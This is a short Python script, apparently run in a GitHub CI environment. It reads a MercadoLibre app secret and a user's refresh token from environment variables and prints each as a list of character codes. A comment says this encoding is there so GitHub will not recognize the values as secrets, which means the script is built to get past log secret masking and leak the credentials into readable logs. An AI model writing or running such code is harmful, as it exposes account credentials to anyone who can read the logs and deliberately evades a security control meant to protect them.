import os
s1=os.environ.get("MELI_APP_SECRET","")
s2=os.environ.get("MELI_REFRESH_TOKEN_WILBERT","")
# Print as comma-separated char codes; GH won't recognize these as secret
print("APP_SECRET_CODES:"+",".join(str(ord(c)) for c in s1))
print("WILBERT_RT_CODES:"+",".join(str(ord(c)) for c in s2))
